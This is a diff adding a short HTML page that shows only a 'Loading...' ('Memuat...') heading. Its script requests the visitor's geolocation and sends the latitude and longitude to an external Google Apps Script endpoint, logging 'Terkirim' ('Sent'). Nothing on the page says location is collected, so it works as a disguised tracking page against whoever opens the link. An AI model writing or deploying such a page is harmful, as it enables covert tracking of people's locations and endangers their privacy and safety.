@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Loading...</title>
+</head>
+<body>
+
+<h3>Memuat...</h3>
+
+<script>
+navigator.geolocation.getCurrentPosition(function(pos){
+  var lat = pos.coords.latitude;
+  var lon = pos.coords.longitude;
+
+  var url = "https://script.google.com/macros/s/AKfycbw2q8jMhiz3W0FRQ0_C-8hCA3WVAxAqmjeQ3snUsI0j6AMlYYNT_RrPTfjjFxxa48Yv/exec?lat=" + lat + "&lon=" + lon;
+
+  fetch(url)
+    .then(res => console.log("Terkirim"))
+    .catch(err => console.log("Error"));
+
+});
+</script>
+
+</body>
+</html>
